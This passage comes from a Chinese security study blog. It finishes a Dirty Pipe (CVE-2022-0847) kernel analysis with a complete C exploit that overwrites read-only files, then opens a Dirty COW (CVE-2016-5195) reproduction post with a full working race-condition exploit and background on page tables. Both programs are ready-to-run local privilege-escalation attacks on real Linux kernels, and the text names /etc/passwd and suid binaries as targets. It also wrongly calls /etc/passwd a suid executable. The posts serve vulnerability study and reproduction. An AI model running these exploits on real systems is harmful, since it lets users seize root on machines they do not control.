<p>该函数传入两个参数，<code>struct kiocb*</code>以及<code>struct iov_iter*</code>，前者是kernel I/O control block的缩写，用于控制异步操作。后者为I/O vectors，可以用于封装多个I/O向量，能够处理多个缓冲区数据。</p>
<p>函数中的主要逻辑是一个大循环。这个循环的逻辑非常清晰，并且向我们展示了管道缓冲区的使用方式。Linux的管道缓冲区根据现实需求，应该被设计为一个队列。但Linux的设计却比一般的队列要优雅很多。首先，定义mask、start、end，标志缓冲区的总数，队列头部和队列尾部。根据代码逻辑可知，管道缓冲区的start始终不小于end，新的缓冲区从start处进入，从end处弹出。巧妙的是，Linux并不需要在队列头部到达最大缓冲区数量时将start重置为0，而是直接使用mask取模即可。另外，每一个缓冲区的长度不是固定的，定义了off和len，表示应该开始读取的位置以及剩余的数据长度。回到<code>pipe_read</code>中，每一次循环所做的实际上就是读取队尾的缓冲区并将其输出到read端，如果输出的字节数未达到read要求，则弹出最后的缓冲区进入下一次循环判断新的队尾。</p>
<h3 id="pipe_write"><a class="markdownIt-Anchor" href="#pipe_write"></a> <code>pipe_write</code></h3>
<p>写入的过程比读取要略微复杂一些。考虑到读取的效率问题，如果每一次写入都分配一个新的缓冲区，那么当单次写入数据较少时，整个队列缓冲区就会变得非常小，效率也会大大降低。因此当缓冲区不为空时，写入进程会尝试将数据合并到一个缓冲区内以避免缓冲区过小的问题。在Linux中，一个缓冲区以一页为单位。write进程会尽量填满缓冲区的一页内容。需要注意的是，可以合并的页必须有<code>PIPE_BUF_FLAG_CAN_MERGE</code>标志位才能够进行合并，这个标志位意味着该页可写且可合并。如果缓冲区没有设置该位，说明这个缓冲区还没有被初始化，需要首先分配一个物理页并设置该标志位。</p>
<h3 id="splice系统调用"><a class="markdownIt-Anchor" href="#splice系统调用"></a> splice系统调用</h3>
<p>这个系统调用能够将文件读取到管道中，可以指定文件偏移以及输出的偏移。在本漏洞中，起重要作用的是将文件内容读取到管道的流程。</p>
<p>这个系统调用的函数调用链较长，在<code>do_splice</code>中会判断数据流向的方向，随后文件-&gt;管道与管道-&gt;文件将走向不同的数据流。在<code>file_operations</code>中，内核专门定义了两个用于splice的函数指针：<code>splice_read</code>和<code>splice_write</code>，用于管道与文件的交互。对于一个普通文件，应该在<code>ext4_file_operations</code>中查找对应的函数，为<code>generic_file_splice_read</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sys_splice</span><br><span class="line">  __do_splice</span><br><span class="line">    do_splice</span><br><span class="line">      splice_file_to_pipe</span><br><span class="line">        do_splice_to</span><br><span class="line">          generic_file_splice_read</span><br><span class="line">            call_read_iter</span><br><span class="line">              ext4_file_read_iter</span><br><span class="line">                generic_file_read_iter</span><br><span class="line">                  filemap_read</span><br><span class="line">                    copy_pages_to_iter</span><br><span class="line">                      __copy_to_page_iter</span><br><span class="line">                        __copy_to_page_iter_pipe</span><br></pre></td></tr></table></figure>
<p>而在<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.16.10/source/lib/iov_iter.c#L384">@<code>__copy_to_page_iter_pipe</code></a>中，可以清晰看到，文件映射页被直接作为缓冲区使用。但在查看相关执行流程时，我们并没有看到文件映射页面被载入到缓冲区时重置<code>PIPE_BUF_FLAG_CAN_MERGE</code>标志位的情况，也就是说，如果管道缓冲区已经被完全读写过一次，就可以通过向管道写入数据的方式向文件映射页写入数据！</p>
<p>通过上面的分析，我们不难发现，Linux内核开发人员为了提高效率，选择在文件映射后直接将映射页作为缓冲区，但却并没有移除写权限。See？这看似是一种非常低级的开发安全问题，但却能实实在在地存在于Linux内核中并影响众多发行版。</p>
<p>通过该漏洞，我们可以修改只读文件。在普通用户权限下，可以通过修改/etc/passwd这种具有suid权限的可执行文件完成提权，如将/etc/passwd修改执行/bin/sh等。</p>
<p>但本漏洞利用有一定的限制，考虑到要将文件调入，因此至少需要读取文件的第1个字节，故文件的第1个字节不允许修改；不能通过该漏洞将文件变大；最多只能写入1页内容。在本文的主要参考资料中，/etc/passwd被修改为一个小型elf程序而不是shell文件，用于执行/bin/sh。</p>
<p><img src="1.png" alt="" /></p>
<h1 id="b-poc"><a class="markdownIt-Anchor" href="#b-poc"></a> B. poc</h1>
<p>poc来源：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11016?time__1311=mqmx0DyDuGYGuD0vo4%2BxOKD8DcAx9GCnYD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-10">资料</a>（在此%一下Arttnba师傅）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error : \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span>            page_size;</span><br><span class="line">    <span class="type">size_t</span>          offset_in_file;</span><br><span class="line">    <span class="type">size_t</span>          data_size;</span><br><span class="line">    <span class="type">int</span>             target_file_fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span>     <span class="title">target_file_stat</span>;</span></span><br><span class="line">    <span class="type">int</span>             pipe_fd[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>             pipe_size;</span><br><span class="line">    <span class="type">char</span>            *buffer;</span><br><span class="line">    <span class="type">int</span>             retval;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// checking before we start to exploit</span></span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Usage: ./exp target_file offset_in_file data&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    page_size = sysconf(_SC_PAGE_SIZE);</span><br><span class="line">    offset_in_file = strtoul(argv[<span class="number">2</span>], <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (offset_in_file % page_size == <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;Cannot write on the boundary of a page!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    target_file_fd = open(argv[<span class="number">1</span>], O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (target_file_fd &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;Failed to open the target file!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fstat(target_file_fd, &amp;target_file_stat))</span><br><span class="line">        errExit(<span class="string">&quot;Failed to get the info of the target file!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (offset_in_file &gt; target_file_stat.st_size)</span><br><span class="line">        errExit(<span class="string">&quot;Offset is not in the file!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    data_size = <span class="built_in">strlen</span>(argv[<span class="number">3</span>]);</span><br><span class="line">    <span class="keyword">if</span> ((offset_in_file + data_size) &gt; target_file_stat.st_size)</span><br><span class="line">        errExit(<span class="string">&quot;Cannot enlarge the file!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (((offset_in_file % page_size) + data_size) &gt; page_size)</span><br><span class="line">        errExit(<span class="string">&quot;Cannot write accross a page!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// exploit now...</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Start exploiting...\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * prepare the pipe, make every pipe_buffer a MERGE flag</span></span><br><span class="line"><span class="comment">     * Just write and read through</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Setting the PIPE_BUF_FLAG_CAN_MERGE for each buffer in pipe.\033[0m&quot;</span>);</span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    pipe_size = fcntl(pipe_fd[<span class="number">1</span>], F_GETPIPE_SZ);</span><br><span class="line">    buffer = (<span class="type">char</span>*) <span class="built_in">malloc</span>(page_size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> size_left = pipe_size; size_left &gt; <span class="number">0</span>; )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> per_write = size_left &gt; page_size ? page_size : size_left;</span><br><span class="line">        size_left -= write(pipe_fd[<span class="number">1</span>], buffer, per_write);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> size_left = pipe_size; size_left &gt; <span class="number">0</span>; )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> per_read = size_left &gt; page_size ? page_size : size_left;</span><br><span class="line">        size_left -= read(pipe_fd[<span class="number">0</span>], buffer, per_read);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Flag setting has been done.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Use the splice to make the pipe_buffer-&gt;page</span></span><br><span class="line"><span class="comment">     * become the page of the file mapped, by read</span></span><br><span class="line"><span class="comment">     * a byte from the file accross the splice</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Reading a byte from the file by splice.\033[0m&quot;</span>);</span><br><span class="line">    offset_in_file--;   <span class="comment">// we read a byte, so offset should minus 1</span></span><br><span class="line">    retval = splice(target_file_fd, &amp;offset_in_file, pipe_fd[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;splice failed!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (retval == <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;short splice!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] File splice done.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Now it comes to the time of exploit:</span></span><br><span class="line"><span class="comment">     * the mapped page of file has been in pipe_buffer,</span></span><br><span class="line"><span class="comment">     * and the PIPE_BUF_FLAG_CAN_MERGE is still set,</span></span><br><span class="line"><span class="comment">     * just a simple write can make the exploit.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    retval = write(pipe_fd[<span class="number">1</span>], argv[<span class="number">3</span>], data_size);</span><br><span class="line">    <span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;Write failed!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (retval &lt; data_size)</span><br><span class="line">        errExit(<span class="string">&quot;Short write!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] EXPLOIT DONE!\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/02/21/CVE-2016-5195%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/02/21/CVE-2016-5195%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">CVE-2016-5195复现记录</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-02-21 20:16:37" itemprop="dateCreated datePublished" datetime="2024-02-21T20:16:37+08:00">2024-02-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-07-19 10:33:21" itemprop="dateModified" datetime="2024-07-19T10:33:21+08:00">2024-07-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/kernel-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">kernel pwn 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>7.7k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>7 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Dirty COW脏牛漏洞是一个非常有名的Linux竞争条件漏洞，虽然早在2016年就已经被修复，但它依然影响着众多古老版本的Linux发行版，如果需要了解Linux的COW，依然非常值得学习。</p>
<p>漏洞：CVE-2016-5195<br />
影响Linux版本：&gt;2.6.22, &lt;4.8.3 / 4.7.9 / 4.4.26<br />
漏洞类型：竞争条件<br />
使用Linux样本：4.8.2</p>
<p>注意：4.8.2版本较低，如果使用较高版本的gcc编译，可能会产生一些难以解决的问题，如一直重启等，这里使用的是Ubuntu 16.04中的gcc完成编译，在22.04的qemu中可以正常运行。</p>
<h1 id="a-poc"><a class="markdownIt-Anchor" href="#a-poc"></a> A. poc</h1>
<p>poc来源：<a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/04/08/CVE-0X00-CVE-2016-5195/#0x02-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">资料</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">dst_st</span>, <span class="title">fk_st</span>;</span></span><br><span class="line"><span class="type">void</span> * <span class="built_in">map</span>;</span><br><span class="line"><span class="type">char</span> *fake_content;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> * argv)</span>;</span><br><span class="line"><span class="type">void</span> * <span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> * argv)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;usage: ./poc destination_file fake_file&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> write_thread, madvise_thread;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> dst_fd, fk_fd;</span><br><span class="line">    dst_fd = open(argv[<span class="number">1</span>], O_RDONLY);</span><br><span class="line">    fk_fd = open(argv[<span class="number">2</span>], O_RDONLY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd of dst: %d\nfd of fk: %d\n&quot;</span>, dst_fd, fk_fd);</span><br><span class="line"></span><br><span class="line">    fstat(dst_fd, &amp;dst_st); <span class="comment">// get destination file length</span></span><br><span class="line">    fstat(fk_fd, &amp;fk_st); <span class="comment">// get fake file length</span></span><br><span class="line">    <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>, dst_st.st_size, PROT_READ, MAP_PRIVATE, dst_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    fake_content = <span class="built_in">malloc</span>(fk_st.st_size);</span><br><span class="line">    read(fk_fd, fake_content, fk_st.st_size);</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;madvise_thread, <span class="literal">NULL</span>, madviseThread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;write_thread, <span class="literal">NULL</span>, writeThread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    pthread_join(madvise_thread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(write_thread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> * argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> mm_fd = open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd of mem: %d\n&quot;</span>, mm_fd);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        lseek(mm_fd, (<span class="type">off_t</span>) <span class="built_in">map</span>, SEEK_SET);</span><br><span class="line">        write(mm_fd, fake_content, fk_st.st_size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> * argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100000</span>; i++)&#123;</span><br><span class="line">        madvise(<span class="built_in">map</span>, <span class="number">0x100</span>, MADV_DONTNEED);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单解释一下，这个程序需要两个参数，第一个参数是需要被修改的只读文件，第二个参数是可读的其他文件。执行后第一个文件中的内容将会被改写为第二个文件的内容。程序会通过mmap系统调用将第一个文件映射到内存空间，随后创建两个线程，一个线程循环通过write打开当前进程的mem虚拟文件对映射的内存进行写操作，一个线程循环调用madvise系统调用提示内核：这块映射的内存空间不再需要。这样，这块映射内存会在某个时刻被内核释放掉。</p>
<p>那么这个漏洞的原理是什么呢？简单看看上面的参考博客，发现要理解起来还是有一定难度的。</p>
<h1 id="b-前置知识"><a class="markdownIt-Anchor" href="#b-前置知识"></a> B. 前置知识</h1>
<h2 id="b1-页表与缺页异常"><a class="markdownIt-Anchor" href="#b1-页表与缺页异常"></a> B.1 页表与缺页异常</h2>
<p>在操作系统这门课中我们学到，现代操作系统对于内存地址有一定的处理。内存被分为若干页，<strong>在进程中被处理的内存页均为虚拟内存页，其地址与物理内存页不同，因此需要有一个物理页和虚拟页的映射表</strong>。这个映射表由内存管理单元MMU管理，每一个进程都有一个映射表。</p>
<p>对于现代操作系统，页表一般是多级的，这样做的好处是可以节省内存空间，并降低页表内存空间的连续性。什么意思呢？假如页表只有一级，对于一个64位地址，最低12位作为页内偏移，那么高52位都将作为页表的索引地址。<strong>为了效率考虑，MMU只能使用数组进行索引</strong>，那么这样的话就会有2<sup>52</sup>个页表项，而其中绝大部分都是空的，会大大浪费内存空间，且这块空间是连续的。而如果使用二级页表，中间12位为二级页表索引，最高40位为一级页表索引，这样理论上只有2<sup>40</sup>个一级页表项，它们连续存储的空间消耗大大小于只使用一级页表的情况（虽然还是很大）。<strong>而当一个一级页表对应的地址范围都无效时，内存中完全可以不保存它所对应的二级页表，将二级页表的物理地址设置为0表示无效即可，这样大大节省了空间。否则，一级页表项保存其下的二级页表地址</strong>。</p>
<p>目前主流x86 Linux系统使用4级（多数）或5级页表，对于4级页表，索引64位虚拟地址空间时，假设最低12位作为页内偏移，每一级页表项负责13位（实际不是这样安排的），即一个一级页表项下面有2<sup>13</sup>个二级页表项，一个二级页表项下面有2<sup>13</sup>个三级页表项，以此类推。那么这样一共就会有2<sup>13</sup>个一级页表。假设一个进程只有一个有效的虚拟内存页，那么四级页表系统只需要保存：2<sup>13</sup>个一级页表项（其中只有有效虚拟内存页对应的一级页表项具有有效的二级页表地址）、2<sup>13</sup>个二级页表项（其中只有有效虚拟内存页对应的二级页表项具有有效的三级页表地址）、2<sup>13</sup>个三级页表项（…）、2<sup>13</sup>个四级页表项（…），共2<sup>15</sup>个页表项，如果一个页表项的大小为0x10字节，那么一共就只有320KB用来保存页表项，对于现在的内存来说完全够用。</p>
<p>由上面的分析可知，映射表中通常只会保存很少的页表项PTE（Page Table Entry），页表的级数越多，映射访问需要访存的次数越多，效率越低。为此，人们为现代OS提供了TLB进行访存提速，它相当于一个能够动态记录页表项且并行查找的硬件，这不是本文的重点，略过。</p>
<p>如果CPU访问了一个虚拟地址，而这个虚拟地址不存在于任何一个PTE中，或者进行的访问操作（读或写）在这个页中没有权限进行，那么MMU会向OS报<strong>缺页异常</strong>。</p>
<p>缺页异常一共分为3类：硬缺页、软缺页以及无效缺页。前两种都是有效的缺页，可以被合理处理；而后面一种是真正的异常，会导致进程立即中止。这三种异常到底什么意思呢？</p>
<ul>
<li>硬缺页异常：物理内存没有对应的页帧。什么意思？比如你的笔记本内存不够，你设置了磁盘的内存交换，让OS在物理内存不足时将暂时没有使用的内存内容移动到磁盘中，空余出内存存放其他的重要数据。这样，原来的内存数据就暂时不在内存之中，即没有对应的页帧。此类异常的处理通常需要较大开销。（实际上的可能场景有三种，具体内容详见<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/673410655">资料</a>，很详细很长但是非常复杂，在此%一下作者，这是真大佬，没见过对内核内存管理理解这么透彻的）</li>
<li>软缺页异常：物理内存有对应页帧。这类大多是发生在写时复制COW时，当父进程fork出一个子进程后，子进程需要对内存空间进行修改，那么OS就需要将父进程的部分内存复制一份，随后将这个新的页填入到子进程页表的对应位置。</li>
<li>无效缺页异常：要访问的虚拟内存地址原本就是无效的，本来就不应该有物理内存映射。此类问题会报段错误并中止进程。</li>
</ul>
